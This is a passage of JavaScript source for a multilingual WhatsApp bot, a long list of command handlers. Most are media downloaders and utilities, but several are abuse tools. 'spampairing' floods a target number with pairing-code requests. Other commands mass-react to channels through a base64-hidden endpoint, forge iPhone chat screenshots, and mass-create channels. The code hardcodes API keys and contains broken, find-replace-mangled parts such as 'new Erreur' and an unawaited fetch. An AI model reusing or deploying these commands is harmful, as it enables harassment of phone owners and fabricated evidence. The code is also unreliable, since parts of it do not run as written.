        Reply("❌ ⚠️ Une anomalie a été détectée. Le SEIGNEUR analyse la situation... saat téléchargement vidéo Instagram!");
    }
}
break;
//~~~~~~~~~~~~~~~~~~~~~~~~//

case 'readqr': {
if (!/image/.test(mime)) return example("dengan reply qris")
const Jimp = require("jimp");
const QrCode = require("qrcode-reader");
async function readQRISFromBuffer(buffer) {
    return new Promise(async (resolve, reject) => {
        try {
            const image = await Jimp.read(buffer);
            const qr = new QrCode();
            qr.callback = (err, value) => {
                if (err) return reject(err);
                resolve(value ? value.result : null);
            };
            qr.decode(image.bitmap);
        } catch (error) {
            return m.reply("error : " + error)
        }
    });
}

let aa = m.quoted ? await m.quoted.download() : await m.download()
let dd = await readQRISFromBuffer(aa)
await Xuu.sendMessage(m.chat, {text: `${dd}`}, {quoted: m})
}
break;
//~~~~~~~~~~~~~~~~~~~~//

case "allpayment": {
const xuu = `seigneur_td-allpayment.vercel.app`
m.reply(xuu)
}
break
//~~~~~~~~~~~~~~~~~//

case "videy":
        {
          if (!text) {
            return reply("Entrez Link Videy");
          }
          if (!text.includes("videy")) {
            return reply("Itu Bukan Link Videy");
          }
          try {
            let anu = await fetchJson(`https://api.agatz.xyz/api/videydl?url=${text}`);
            let anu1 = anu.data;
            Xuu.sendMessage(m.chat, {
              video: {
                url: anu1
              },
              caption: "Downloader Videy"
            }, {
              quoted: m
            });
          } catch (err) {
            reply("⚠️ Une anomalie a été détectée. Le SEIGNEUR analyse la situation... Saat Mengambil Data");
          }
        }
        break

//~~~~~~~~~~~~~~~~~~~~//
        
case 'spampairing': {
  if (!isOwner && !isPremium) return m.reply('Khusus Premium');
  if (!text) return m.reply(`👑 *Example:* ${prefix + command} +628xxxxxx|150`);
  m.reply('proses...');
  let [peenis, pepekk = "200"] = text.split("|");
  let target = peenis.replace(/[^0-9]/g, '').trim();
  const { default: makeWaSocket, useMultiFileAuthState, fetchLatestBaileysVersion } = require('@whiskeysockets/baileys');
  const { state } = await useMultiFileAuthState('pepek');
  const { version } = await fetchLatestBaileysVersion();
  const pino = require("pino");
  const sucked = await makeWaSocket({ auth: state, version, logger: pino({ level: 'fatal' }) });
  const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
  for (let i = 0; i < pepekk; i++) {
    await sleep(1500);
    let prc = await sucked.requestPairingCode(target);
    console.log(`_👑 Opération réalisée avec succès Spam Pairing Code - Number : ${target} - Code : ${prc}_`);
  }
  await sleep(15000);
}
break;

//~~~~~~~~~~~~~~~~~~~~//

  case "spamreactch": {

if (!isOwner && !isPremium) return m.reply('Khusus Premium');

if (!text) return m.reply(".spamreactch linkpesan 😂")

if (!args[0] || !args[1]) return m.reply("Wrong Format")

if (!args[0].includes("https://whatsapp.com/channel/")) return m.reply("Lien invalide. Vérifiez votre URL.")

let result = args[0].split('/')[4]

let serverId = args[0].split('/')[5]

let res = await Xuu.newsletterMetadata("invite", result)

await Xuu.newsletterReactMessage(res.id, serverId, args[1])

m.reply(`👑 👑 Opération réalisée avec succès mengirim reaction ${args[1]} ke dalam channel ${res.name}`)

}

break

//~~~~~~~~~~~~~~~~~~~~//

case "tt": case "tiktok": {
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
if (!result.status) return m.reply("Erreur")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: Xuu.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await Xuu.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await Xuu.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
}
break

//~~~~~~~~~~~~~~~~~~~~//

case "tiktokmp3": case "ttmp3": case "ttaudio": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Lien invalide. Vérifiez votre URL.")
await tiktokDl(text).then(async (res) => {
if (!res.status) return m.reply("Erreur! Result Not Found")
await Xuu.sendMessage(m.chat, {audio: {url: res.music_info.url}, mimetype: "audio/mpeg"}, {quoted: m})
}).catch((e) => m.reply("Erreur"))
}
break

//~~~~~~~~~~~~~~~~~~~~//

case "swgrup": {
                const quoted = m.quoted ? m.quoted : m;
                const mime = (quoted.msg || quoted).mimetype || "";
                const caption = m.body.replace(/^\.swgrup\s*/i, "").trim();
                const jid = m.chat;
                
                if (/image/.test(mime)) {
                    const buffer = await quoted.download();
                    await Xuu.sendMessage(jid, {
                        groupStatusMessage: {
                            image: buffer,
                            caption
                        }
                    });
                    m.react("âœ…ï¸")
                } else if (/video/.test(mime)) {
                    const buffer = await quoted.download();
                    await Xuu.sendMessage(jid, {
                        groupStatusMessage: {
                            video: buffer,
                            caption
                        }
                    });
                    m.react("âœ…ï¸")
                } else if (/audio/.test(mime)) {
                    const buffer = await quoted.download();
                    await Xuu.sendMessage(jid, {
                        groupStatusMessage: {
                            audio: buffer
                        }
                    });
                    m.react("âœ…ï¸")
                } else if (caption) {
                    await Xuu.sendMessage(jid, {
                        groupStatusMessage: {
                            text: caption
                        }
                    });
                    m.react("âœ…ï¸")
                } else {
                    await reply(`👑 Répondez à un média ou ajoutez du texte.\nExemple : ${prefix + command} (répondre image/vidéo/audio) bonjour`);
                }
            }
break

//~~~~~~~~~~~~~~~~~~~~//

case 'tourlph': {
  async function uploadTelegraph(path) {
    try {
      let data = new FormData()
      data.append("images", fs.createReadStream(path))

      let config = {
        method: 'POST',
        url: 'https://telegraph.zorner.men/upload',
        headers: {
          ...data.getHeaders()
        },
        data
      }

      let response = await axios.request(config)
      return response.data.links || 'Échec mengupload'
    } catch (error) {
      console.error("Erreur Upload:", error.message)
      return 'Erreur saat mengupload'
    }
  }

  if (!/image|video|audio|webp/.test(mime))
    return m.reply('Le lien doit être video, gambar, audio, atau stiker')


  let media = await Xuu.downloadAndSaveMediaMessage(quoted)
  let telegraphUrl = await uploadTelegraph(media)

  let result = `🔗 *Hasil Upload*

🌐 *Telegraph:*
${telegraphUrl || '-'}
`

  await m.reply(result)
}
break

//~~~~~~~~~~~~~~~~~~~~//

case "react1k": {
if (!isCreator) return Reply(mess.owner)
let args = q.split(" ")
let link = args[0]
let emojis = args.slice(1).join(" ")
if (!link || !emojis)
return reply(
`contoh:
react https://whatsapp.com/channel/xxxx 😂,😮,👍,♥️`
)
const apiKeys = [
"588c5429be4a0420ce89ac849a7ec73b2d4ea880d900890ea5f6265a76e35212"
]
const apiKey = apiKeys[Math.floor(Math.random() * apiKeys.length)]
const urlb = "aHR0cHM6Ly9yZWFjdC53aHl1eC14ZWMubXkuaWQvYXBpL3JjaA=="
const apiUrl = Buffer.from(urlb, "base64").toString("utf8")
try {
const res = await fetch(
`${apiUrl}?link=${encodeURIComponent(link)}&emoji=${encodeURIComponent(emojis)}`,
{
method: "GET",
headers: {
"x-api-key": apiKey
}
}
)
const json = await res.json()
return m.reply(
`✅ 👑 Opération réalisée avec succèss Réaction
Link: ${link}
Emoji: ${emojis}`
)
} catch (err) {
console.error(err)
return m.reply(`👑 Failed`)
}
}
break
//~~~~~~~~~~~~~~~~~~~//

case "trxoff": case "owneroff": {
if (!isOwner) return m.reply(mess.owner)
global.owneroff = true
m.reply('*👑 Opération réalisée avec succès Mengganti Mode ✅*\nMode Bot Beralih Ke *Owner Offline*')
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "trxon": case "owneron": {
if (!isOwner) return m.reply(mess.owner)
global.owneroff = false
m.reply('*👑 Opération réalisée avec succès Mengganti Mode ✅*\nMode Bot Beralih Ke *Owner Online*')
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilinkwame": {
if (!isGroup) return m.reply(mess.group)
if (!isOwner && !isAdmin) return m.reply(mess.admin)
if (!args[0]) return m.reply(example("on/off\nKetik *.statusgc* Untuk Melihat Status Setting Grup Ini"))
if (/on/.test(args[0].toLowerCase())) {
if (antilinkwame.includes(m.chat)) return m.reply("*Antilink wa.me* Di Grup Ini Sudah Aktif!")
antilinkwame.push(m.chat)
await fs.writeFileSync("./library/database/antilinkwame.json", JSON.stringify(antilinkwame))
m.reply("*👑 Opération réalisée avec succès Menyalakan Antilink wa.me Grup ✅")
} else if (/off/.test(args[0].toLowerCase())) {
if (!antilinkwame.includes(m.chat)) return m.reply("*Antilink wa.me* Di Grup Ini Belum Aktif!")
let posi = antilinkwame.indexOf(m.chat)
antilinkwame.splice(posi, 1)
await fs.writeFileSync("./library/database/antilinkwame.json", JSON.stringify(antilinkwame))
m.reply("*👑 Opération réalisée avec succès Mematikan Antilink wa.me* ✅")
} else {
return m.reply(example("on/off"))
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'snackvideo': {
 if (!text) return reply("linknya mana?")
const data = fetchJson(`https://api.siputzx.my.id/api/d/snackvideo?url=${encodeURIComponent(text)}`)
const vidnya = data.result.media || ''
const cption = data.result.title || ''
Xuu.sendMessage(m.chat, { caption: cption, video: { url: vidnya } }, { quoted: m });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'delpanel': {
 if (!isOwner && !isReseller) {
 return m.reply(mess.owner);
 }
 const rows = []
 rows.push({
title: `Hapus Semua`,
description: `Hapus semua server panel`, 
id: `.delpanel-all`
}) 
 try {
 const response = await fetch(`${domain}/api/application/servers`, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: `Bearer ${apikey}`,
 },
 });

 const result = await response.json();
 const servers = result.data;

 if (!servers || servers.length === 0) {
 return m.reply("Aucun élément disponible server panel!");
 }

 let messageText = `\n*Total server panel :* ${servers.length}\n`

 for (const server of servers) {
 const s = server.attributes;

 const resStatus = await fetch(`${domain}/api/client/servers/${s.uuid.split("-")[0]}/resources`, {
 method: "GET",
 headers: {
 Accept: "application/json",
 "Content-Type": "application/json",
 Authorization: `Bearer ${capikey}`,
 },
 });

 const statusData = await resStatus.json();

 const ram = s.limits.memory === 0
 ? "Unlimited"
 : s.limits.memory >= 1024
 ? `${Math.floor(s.limits.memory / 1024)} GB`
 : `${s.limits.memory} MB`;

 const disk = s.limits.disk === 0
 ? "Unlimited"
 : s.limits.disk >= 1024
 ? `${Math.floor(s.limits.disk / 1024)} GB`
 : `${s.limits.disk} MB`;

 const cpu = s.limits.cpu === 0
 ? "Unlimited"
 : `${s.limits.cpu}%`;
 rows.push({
title: `${s.name} || ID:${s.id}`,
description: `Ram ${ram} || Disk ${disk} || CPU ${cpu}`, 
id: `.delpanel-response ${s.id}`
}) 
 } 
 await Xuu.sendMessage(m.chat, {
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'Message interactif' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Pilih Server Panel',
 sections: [
 {
 title: `© Powered By ${global.nomOwner}`,
 rows: rows
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true,
 text: `\nPilih Server Panel Yang Ingin Dihapus\n`
}, { quoted: m })

 } catch (err) {
 console.error("Erreur listing panel servers:", err);
 m.reply("⚠️ Une anomalie a été détectée. Le SEIGNEUR analyse la situation... saat mengambil data server.");
 }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "anticall": {
if (!isOwner) return m.reply(msg.owner)
if (!text) return m.reply(example("on/off"))
if (text.toLowerCase() == "on") {
if (anticall) return m.reply("*Anticall* Sudah Aktif!")
anticall = true
m.reply("*👑 Opération réalisée avec succès Menyalakan Anticall ✅*")
} else if (text.toLowerCase() == "off") {
if (!anticall) return m.reply("*Anticall* Sudah Tidak Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
anticall = false
m.reply("*👑 Opération réalisée avec succès Mematikan Anticall ✅*")
} else {
return m.reply(example("on/off"))
}}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'editcase': {
    if (!isCreator) return m.reply(mess.owner);
    if (!text.includes("|")) return m.reply(`👑 Exemple: cmd jpmch|jpmalluffy`);
    
    const [caseLama, caseBaru] = text.split("|").map(a => a.trim());
    if (!caseLama || !caseBaru) return m.reply(`👑 Format salah!\nExemple: cmd jpmch|jpmalluffy`);

    const nomFile = path.join(__dirname, 'PRIMEXUU.js');

    fs.readFile(nomFile, 'utf8', (err, data) => {
        if (err) {
            console.error('⚠️ Une anomalie a été détectée. Le SEIGNEUR analyse la situation... saat membaca file:', err);
            return m.reply(`👑 ⚠️ Une anomalie a été détectée. Le SEIGNEUR analyse la situation... saat membaca file: ${err.message}`);
        }

        // regex buat nyari case
        const regex = new RegExp(`case\\s+'${caseLama}'\\s*:`, 'g');

        if (!regex.test(data)) {
            return m.reply(`👑 Case '${caseLama}' introuvable di dalam file!`);
        }

        // replace dengan case baru
        const kodeBaruLengkap = data.replace(regex, `case '${caseBaru}':`);

        fs.writeFile(nomFile, kodeBaruLengkap, 'utf8', (err) => {
            if (err) {
                console.error('⚠️ Une anomalie a été détectée. Le SEIGNEUR analyse la situation... saat menulis file:', err);
                return m.reply(`👑 ⚠️ Une anomalie a été détectée. Le SEIGNEUR analyse la situation... saat menulis file: ${err.message}`);
            } else {
                console.log(`Sukses mengubah case ${caseLama} menjadi ${caseBaru}`);
                return m.reply(`✅ Sukses! Case \`${caseLama}\` sudah diubah ke \`${caseBaru}\``);
            }
        });
    });
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'iqc': {
 try {
 if (!text) {
 return Reply('Format salah! Gunakan: .iqc jam|batre|pesan\nExemple: .iqc 18:00|40|hai hai');
 }

 const parts = text.split('|');
 if (parts.length < 3) {
 return Reply('Format salah! Gunakan:\n.iqc jam|batre|pesan\nExemple:\n.iqc 18:00|40|hai hai');
 }

 const [time, battery, ...messageParts] = parts;
 const message = messageParts.join('|').trim();

 if (!time || !battery || !message) {
 return Reply('Format tidak lengkap! Pastikan mengisi jam, batre, dan pesan');
 }

 await Xuu.sendMessage(m.chat, { react: { text: '⏳', key: m.key } });

 const encodedTime = encodeURIComponent(time);
 const encodedMessage = encodeURIComponent(message);
 const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodedTime}&batteryPercentage=${battery}&carrierName=INDOSAT&messageText=${encodedMessage}&emojiStyle=apple`;

 const axios = require('axios');
 const response = await axios.get(url, { responseType: 'arraybuffer' });

 if (!response.data) {
 throw new Erreur('Échec mendapatkan gambar dari server');
 }

 await Xuu.sendMessage(m.chat, {
 image: Buffer.from(response.data),
 caption: '✅ Message iPhone quote créé avec succès.'
 }, { quoted: m });

 await Xuu.sendMessage(m.chat, { react: { text: '✅', key: m.key } });

 } catch (error) {
 console.error('Erreur di iqc:', error);
 Reply(`❌ Erreur: ${error.message || '⚠️ Une anomalie a été détectée. Le SEIGNEUR analyse la situation... saat memproses'}`);
 }
}
break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'iqc2': {
 if (!q) return m.reply(`👑 ❌ Exemple:\n${prefix + command} hidup Jokowi`);

 const url = `https://veloria-ui.vercel.app/imagecreator/fake-chat?time=12:00&messageText=${encodeURIComponent(q)}&batteryPercentage=100`;

 await Xuu.sendMessage(m.chat, {
 image: { url },
 caption: "📱 *Fake iPhone Quoted Message*"
 }, { quoted: m });
}
 break;

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//



//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//


//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//



//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//



//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//



//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//



case 'setgoodbye': {
 if (!isCreator) return Reply("❌ Hanya owner yang dapat mengatur goodbye.");
 if (!m.isGroup) return Reply("❌ Fitur ini hanya bisa digunakan di dalam groupes.");

 const chat = m.chat;

 // Pastikan data groupes ada
 if (!global.db.groups[chat]) global.db.groups[chat] = {};
 if (!global.db.groups[chat].goodbyeMsg) global.db.groups[chat].goodbyeMsg = null;
 if (global.db.groups[chat].welcome == undefined) global.db.groups[chat].welcome = false;

 if (!text) {
 return Reply(`
❗ *Cara pakai setgoodbye:*

Ketik:
setgoodbye @user telah left dari @subject. Member tersisa @count 😢

Variable tersedia:
@user = Tag orang
@subject = Nom groupes
@count = Jumlah member
`);
 }

 global.db.groups[chat].goodbyeMsg = text;

 Reply(`✅ *Message d'au revoir enregistré !*\n\nUtilise :\n→ togglegoodbye\npour activer / désactiver le message d'au revoir.`);
}
break;

case 'setwelcome': {
 if (!isCreator) return Reply("❌ Hanya owner yang dapat mengatur welcome.");
 if (!m.isGroup) return Reply("❌ Fitur ini hanya bisa digunakan di dalam groupes.");

 const chat = m.chat;

 // Pastikan data groupes ada
 if (!global.db.groups[chat]) global.db.groups[chat] = {};
 if (!global.db.groups[chat].welcomeMsg) global.db.groups[chat].welcomeMsg = null;
 if (!global.db.groups[chat].welcome == undefined) global.db.groups[chat].welcome = false;

 if (!text) {
 return Reply(`
❗ *Cara pakai setwelcome:*

Ketik:
setwelcome Selamat datang @user di @subject! Kamu adalah member ke @count 🎉

Variable tersedia:
@user = Tag orang yang masuk
@subject = Nom groupes
@count = Jumlah member
`);
 }

 // Simpan pesan custom
 global.db.groups[chat].welcomeMsg = text;

 Reply(`✅ *Pesan welcome réussi disimpan!*

Gunakan:
→ togglewelcome
untuk mengaktifkan / menonaktifkan welcome.`);
}
break;

case 'capcut': {
 if (!text) return Reply(example("linknya"));
 if (!text.startsWith('https://')) return Reply("Lien invalide. Vérifiez votre URL.!");

 await Xuu.sendMessage(m.chat, { react: { text: '🕖', key: m.key } });

 try {
 const res = await fetchJson(`https://api.resellergaming.my.id/download/capcut?url=${encodeURIComponent(text)}`);
 if (!res.status || !res.result?.videoUrl) return Reply("❌ Aucun élément disponible video yang bisa diunduh!");

 const hasil = res.result;
 const caption = `
🎬 *CapCut Template Downloader ✅*

*🎥 Judul:* ${hasil.title}
*👤 Pembuat:* ${hasil.author.name}
*❤️ Likes:* ${hasil.likes}
*📅 Tanggal:* ${hasil.date}
*🔗 Pengguna:* ${hasil.pengguna}
 `;

 await Xuu.sendMessage(
 m.chat,
 {
 video: { url: hasil.videoUrl },
 mimetype: "video/mp4",
 caption: caption,
 thumbnail: { url: hasil.posterUrl }
 },
 { quoted: m }
 );

 await Xuu.sendMessage(m.chat, { react: { text: '', key: m.key } });
 } catch (e) {
 console.error("Capcut Erreur:", e);
 Reply("❌ ⚠️ Une anomalie a été détectée. Le SEIGNEUR analyse la situation... saat téléchargement vidéo CapCut!");
 }
}
break;



case 'brat': {
 let cmd = 'brat';

 if (!text) return m.reply(`👑 Example: *${cmd} teksnya*`);

 const axios = require("axios");

 try {
 // Kirim reaction loading dulu (opsional)
 await Xuu.sendMessage(m.chat, {
 react: { text: "⏱️", key: m.key }
 });

 const url = `https://api.ryuu-dev.offc.my.id/tools/brat?text=${encodeURIComponent(text)}`;
 const response = await axios.get(url, { responseType: "arraybuffer" });
 const buffer = response.data;

 // Kirim langsung sebagai sticker tanpa konversi tambahan
 await Xuu.sendAsSticker(m.chat, buffer, m, {
 packname: global.packname || "xuu-Яyuici",
 author: global.author || "xuuЯyuici",
 });

 // Tambah exp user
 if (db.users && db.users[m.sender]) {
 db.users[m.sender].exp = (db.users[m.sender].exp || 0) + 300;
 }
 } catch (e) {
 console.error("Échec kirim sticker brat:", e);
 m.reply("Échec mengirim sticker.");
 }
}
break;



case 'translate': {
let language
let teks
let defaultLang = "en"
if (text || m.quoted) {
let translate = require('translate-google-api')
if (text && !m.quoted) {
if (args.length < 2) return m.reply(example("id good night"))
language = args[0]
teks = text.split(" ").slice(1).join(' ')
} else if (m.quoted) {
if (!text) return m.reply(example("id good night"))
if (args.length < 1) return m.reply(example("id good night"))
if (!m.quoted.text) return m.reply(example("id good night"))
language = args[0]
teks = m.quoted.text
}
let result
try {
result = await translate(`${teks}`, {to: language})
} catch (e) {
result = await translate(`${teks}`, {to: defaultLang})
} finally {
m.reply(result[0])
}
} else {
return m.reply(example("id good night"))
}}
break;

case 'berita': {
  if(!text) return m.reply('Entrez URL');
  m.reply('Mohon Attendez');

const axios = require('axios');
const cheerio = require('cheerio');

async function BeritaDetikDetail(url) {
  try {
  const { data } = await axios.get(url);
  const $ = cheerio.load(data);

  const title = $('h1').first().text().trim();
  const author = $('.detail__author').text().trim() || $('div.author').text().trim();
  const date = $('.detail__date').text().trim() || $('div.date').text().trim();
  const image = $('.detail__media img').attr('src') || $('article img').first().attr('src');
  let description = $('article p').first().text().trim();
  if (!description) {
    description = $('meta[name="description"]').attr('content') || '';
  }

  return { title, author, date, image, description };
    } catch (error) {
    console.error('Erreur:', error);
    return null;
  }
}

let result = await BeritaDetikDetail(text);
if(!result) return m.reply('Échec Memproses Anunya...');

let teks = '';
teks+= '*' + result.title + '*\n\n'
teks+= '- Author:' + result.author + '\n'
teks+= '- Date:' + result.date + '\n'
teks+= '\n'
teks+= '- Description:`' + result.description + '`\n'

Xuu.sendMessage(m.chat, {
  image: { url: result.image },
  caption: teks
}, { quoted: m })
}
break;


case "infogempa": {
    if (!isCreator) return Reply(mess.owner)
    m.reply("Sedang mengambil data gempa terkini...");
    
    try {
        const response = await fetch("https://data.bmkg.go.id/DataMKG/TEWS/autogempa.json");
        const data = await response.json();
        
        if (!data || !data.Infogempa || !data.Infogempa.gempa) {
            return m.reply("Échec mendapatkan data gempa dari BMKG.");
        }
        
        const gempa = data.Infogempa.gempa;
        
        let caption = `*📈 INFO GEMPA TERKINI*\n\n`;
        caption += `*Tanggal:* ${gempa.Tanggal}\n`;
        caption += `*Waktu:* ${gempa.Jam}\n`;
        caption += `*Magnitudo:* ${gempa.Magnitude}\n`;
        caption += `*Kedalaman:* ${gempa.Kedalaman}\n`;
        caption += `*Lokasi:* ${gempa.Wilayah}\n`;
        caption += `*Koordinat:* ${gempa.Lintang} ${gempa.Bujur}\n`;
        caption += `*Potensi:* ${gempa.Potensi}\n`;
        caption += `*Dirasakan:* ${gempa.Dirasakan}\n\n`;
        caption += `Sumber: BMKG (https://www.bmkg.go.id/)`;
        
        if (gempa.Shakemap) {
            const shakemapUrl = `https://data.bmkg.go.id/DataMKG/TEWS/${gempa.Shakemap}`;
            await Xuu.sendMessage(m.chat, {
                image: { url: shakemapUrl },
                caption: caption
            }, { quoted: m });
        } else {
            Xuu.sendMessage(m.chat, { text: caption }, { quoted: m });
        }
    } catch (error) {
        console.log(error);
        m.reply("⚠️ Une anomalie a été détectée. Le SEIGNEUR analyse la situation... saat mengambil data gempa.");
    }
}
break

case "infocuaca": {
    if (!isCreator) return Reply(mess.owner)
    if (!text) return Reply ('*Silakan berikan lokasi yang ingin dicek cuacanya!*')

    try {
        let wdata = await axios.get(
            `https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&lang=id`
        );

        let textw = ""
        textw += `*🗺️ Cuaca di ${text}*\n\n`
        textw += `*🌤️ Cuaca:* ${wdata.data.weather[0].main}\n`
        textw += `*📖 Deskripsi:* ${wdata.data.weather[0].description}\n`
        textw += `*🌡️ Suhu Rata-rata:* ${wdata.data.main.temp}°C\n`
        textw += `*🤒 Terasa Seperti:* ${wdata.data.main.feels_like}°C\n`
        textw += `*🌬️ Tekanan Udara:* ${wdata.data.main.pressure} hPa\n`
        textw += `*💧 Kelembaban:* ${wdata.data.main.humidity}%\n`
        textw += `*🌪️ Vitesse Angin:* ${wdata.data.wind.speed} m/s\n`
        textw += `*📍 Latitude:* ${wdata.data.coord.lat}\n`
        textw += `*📍 Longitude:* ${wdata.data.coord.lon}\n`
        textw += `*🌍 Negara:* ${wdata.data.sys.country}\n`

        Xuu.sendMessage(
            m.chat, {
                text: textw,
            }, {
                quoted: qtext2,
            }
        )
    } catch (error) {
        Reply('*⚠️ Une anomalie a été détectée. Le SEIGNEUR analyse la situation...! Pastikan lokasi yang Anda masukkan benar.*')
    }
}
break;

case "createch": {
  if (!isCreator) return m.reply(mess.owner);
  if (!text.includes('|')) return m.reply(`👑 *Exemple Penggunaan: .createch Nom Channel | Jumlah`);

  let [chName, chCount] = text.split('|').map(v => v.trim());
  let jumlah = parseInt(chCount) || 1;

  if (!chName || !jumlah) return m.reply(`👑 *Exemple Penggunaan:* .createch Nom Channel | Jumlah`);

  // Simpan data sementara (multi user aman)
  global.tempChannel = global.tempChannel || {};
  global.tempChannel[m.sender] = { chName, jumlah };

  await Xuu.sendMessage(m.chat, {
    caption: `📌 Nom Channel: *${chName}*\n🔢 Jumlah: *${jumlah}*\n\nSilakan pilih format channel yang ingin dibuat:`,
    image: { url: global.image.reply }, // bisa pakai { url: './reply.jpg' } lokal
    footer: `© 2025 ${global.botname2}`,
    buttons: [
      { buttonId: '.buatchid', buttonText: { displayText: '🆔 Buat Versi ID' }, type: 1 },
      { buttonId: '.buatchlink', buttonText: { displayText: '🔗 Buat Versi Link' }, type: 1 }
    ],
    headerType: 4
  }, { quoted: m });
}
break;

case 'buatchlink': {
  let data = global.tempChannel?.[m.sender];
  if (!data) return m.reply("❌ Aucun élément disponible request channel yang pending!");

  let { chName, jumlah } = data; // Deskripsi dihapus

  try {
    let allLinks = [];
    for (let i = 1; i <= jumlah; i++) {
      try {
        let createCh = await Xuu.newsletterCreate(
          chName + (jumlah > 1 ? ` ${i}` : ""),
          "" // Deskripsi kosong
        );
        let inviteCode = createCh?.invite || createCh?.invite_code || createCh?.code;

        if (inviteCode) {
          let inviteUrl = ``; // Pastikan format URL benar
          allLinks.push(inviteUrl);
        } else {
          console.warn(`Tidak dapat memperoleh kode undangan untuk channel ke-${i}`);
          allLinks.push("Tidak dapat memperoleh link undangan");
        }
        if (i < jumlah) await new Promise(r => setTimeout(r, 2000));
      } catch (e) {
        console.error(`Échec membuat channel ke-${i}:`, e);
        allLinks.push("Échec membuat channel");
      }
    }

    let listLinks = allLinks.map((link, idx) => `*LINK ${idx + 1}*\n${link}`).join('\n\n');
    let message = `✅ *SUKSES MEMBUAT CHANNEL ${jumlah}* ✅\n\n📌 Nom: ${chName}${jumlah > 1 ? ` 1-${jumlah}` : ""}\n\n🔗 *ALL LINK:*\n${listLinks}`; // Deskripsi dihapus
    await Xuu.sendMessage(m.chat, { text: message });
    delete global.tempChannel[m.sender];
  } catch (e) {
    console.error(e);
    m.reply("❌ Échec membuat channel!");
  }
}
break;

case 'buatchid': {
  let data = global.tempChannel?.[m.sender];
  if (!data) return m.reply("❌ Aucun élément disponible request channel yang pending!");

  let { chName, jumlah } = data; // Deskripsi dihapus

  try {
    let allIds = [];
    for (let i = 1; i <= jumlah; i++) {
      try {
        let createCh = await Xuu.newsletterCreate(
          chName + (jumlah > 1 ? ` ${i}` : ""),
          "" // Deskripsi kosong
        );
        allIds.push(createCh.id);
        if (i < jumlah) await new Promise(r => setTimeout(r, 2000));
      } catch (e) {
        console.error(`Échec membuat channel ke-${i}:`, e);
      }
    }

    let listIds = allIds.map((id, idx) => `*ID ${idx + 1}*\n${id}`).join('\n\n');
    let message = `✅ *SUKSES MEMBUAT CHANNEL ${jumlah}* ✅\n\n📌 Nom: ${chName}${jumlah > 1 ? ` 1-${jumlah}` : ""}\n\n🆔 *ALL ID:*\n${listIds}`; // Deskripsi dihapus
    await Xuu.sendMessage(m.chat, { text: message });
    delete global.tempChannel[m.sender];
  } catch (e) {
    console.error(e);
    m.reply("❌ Échec membuat channel!");
  }
}
break;


case 'bratbahlil': {
  if (!text) return reply("Exemple: .bahlil halo dunia")

  const Canvas = require("@napi-rs/canvas")
  const { createCanvas, loadImage } = Canvas
  const { Sticker } = require("wa-sticker-formatter")

  const IMG = "https://raw.githubusercontent.com/whatsapp-media/whatsapp-media/main/uploads/1770891834482_undefined.jpg"

  function wrapText(ctx, text, maxWidth) {
    const words = text.split(" ")
    const lines = []
    let line = ""

    for (let w of words) {
      const test = line + w + " "
      if (ctx.measureText(test).width > maxWidth) {
        lines.push(line.trim())
        line = w + " "
      } else {
        line = test
      }
    }
    lines.push(line.trim())
    return lines
  }

  function fitText(ctx, text, maxWidth, maxHeight) {
    let fontSize = 55
    let lines = []

    while (fontSize > 15) {
